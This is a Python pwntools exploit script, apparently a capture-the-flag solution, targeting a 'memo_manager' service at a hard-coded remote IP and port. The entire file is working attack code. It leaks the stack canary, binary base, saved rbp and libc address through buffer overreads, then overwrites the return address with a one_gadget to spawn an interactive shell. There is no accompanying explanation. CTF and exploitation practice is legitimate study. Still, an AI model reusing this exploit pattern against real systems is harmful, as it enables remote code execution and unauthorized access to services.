#!/usr/bin/env python3
from pwn import *
import pwnlib.shellcraft

debug = 0

c = 0
pwn_file = "./memo_manager"
elf = ELF(pwn_file)
if debug == 1: 
    c = process(pwn_file)
else: c = remote('140.110.112.77', 2115)
 
context.os='linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

if debug:
    elf_path = c.cwd + c.argv[0].decode().strip('.')
    print(c.libs())
    gdbcmd = '''
    set $elf_base={}
    vmmap
    p $elf_base 

    #b *$elf_base + 0xc37
    #b *$elf_base + 0x00ea9
    b *$elf_base + 0xf92
    '''.format(hex(c.libs()[elf_path]))

    gdb.attach(c, gdbcmd)
    context.log_level ='debug'

context.log_level ='debug'

def send_command(data):
    c.recvuntil(':')
    c.send(data)

def send_data(data):
    c.recvuntil(':')
    c.send(data)
    c.recvuntil(':') # fix io

def echo_server(say):
    c.sendlineafter(':', '1')
    c.sendafter(':', say)
    c.recvuntil('You said: ')
    return c.recvline()[:-1]


def run_rop(ropchain=b'', rbp_addr=0):
    global elf_base

    # max ulen
    send_command('2\n')
    send_command('1\n')
    send_command('A' * 0x10)
    send_command('2\n')
    send_command('2\n')
    send_command('A' * 0x10)
    send_command('2\n')
    send_command('3\n')
    send_command('A' * 0x10 ) 
    send_command('4\n')
    send_command('1\n')
    send_data('A' * 0x10)

    # leak canary
    send_command('4\n')
    send_command('3\n')
    send_data('C' * (0x18) + '!')

    send_command('3\n')
    send_command('3\n')
    c.recvuntil('!')
    canary = b'\0' + c.recvn(7)
    elf_base = u64(c.recvn(6) + b'\0\0') - 0xfa0

    print(canary)
    print(hex(elf_base))

    send_command('4\n')
    send_command('2\n')
    send_data('A' * 0x10)

    send_command('4\n')
    send_command('3\n')
    if rbp_addr == 0:
        rbp_addr = p64(elf_base + 0x10900) # rbp to .data
    ret_addr = p64(elf_base + 0x930)
    if ropchain == b'':
        ropchain = ret_addr
        
    print(b'rop:' + ropchain)

    send_data(b'C' * (0x18) + canary + rbp_addr + ropchain)

    send_command('5\n')


rbp = u64(echo_server(b'a'*0x20)[0x20:] + b'\0\0') # leak rbp
libc_addr = u64(echo_server(b'a' * 0x48)[0x48:] + b'\0\0') - (0x36e90+16) # leak libc atoi+16
print(hex(rbp))
print(hex(libc_addr))


# for debug remote libc base
gets_addr = libc_addr + 0x6ed90
puts_addr = libc_addr + 0x6f6a0
# run_rop(p64(gets_addr))
#run_rop(p64(puts_addr))

#input()
#one_gadget = libc_addr + 0x45226 # rax == NULL
#one_gadget = libc_addr + 0xf0364 # rsp+0x50
#one_gadget = libc_addr + 0x4527a # rsp+0x30
one_gadget = libc_addr + 0xf1207 # rsp+0x70
run_rop(p64(one_gadget))
c.interactive()
#run_rop()
print(hex(elf_base))
elf.base = elf_base


jmp_rbp = libc_addr + 0x181e0b 

xor_rax = libc_addr + 0x000000000008b8c5 # xor rax, rax ; ret
p64(xor_rax)

#run_rop(p64(gets_addr))

#run_rop(p64(elf_base + 0xb38)) # b38 : leave ; ret


c.interactive()
c.close()

